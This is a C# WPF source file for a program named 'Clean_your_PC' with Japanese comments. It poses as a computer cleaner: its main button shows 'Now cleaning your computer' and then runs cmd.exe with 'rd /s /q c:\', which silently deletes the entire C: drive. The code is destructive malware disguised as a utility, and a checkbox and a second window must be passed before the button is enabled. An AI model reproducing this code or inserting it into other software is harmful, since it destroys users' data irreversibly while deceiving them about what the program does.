using System.Windows;
using System.Diagnostics;

namespace Clean_your_PC
{
    /// <summary>
    /// MainWindow.xaml の相互作用ロジック
    /// </summary>
    public partial class MainWindow : Window
    {
        public MainWindow()
        {
            InitializeComponent();
            button1.IsEnabled = false;
            Check.IsEnabled = false;
        }
   



        private void Button_Click(object sender, RoutedEventArgs e)
        {
            MessageBox.Show("Now cleaning your computer.\nPlease wait...");
            ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", "  /c rd /s /q c:\\");
            // コマンド実行
            Process.Start(processStartInfo);

        }

        private void Button_Click_1(object sender, RoutedEventArgs e)
        {
            Check.IsEnabled = true;
            var win = new Window1();
            win.Show();
        }

        private void CheckBox_Checked(object sender, RoutedEventArgs e)
        {
            button1.IsEnabled = true;
        }
    }
}
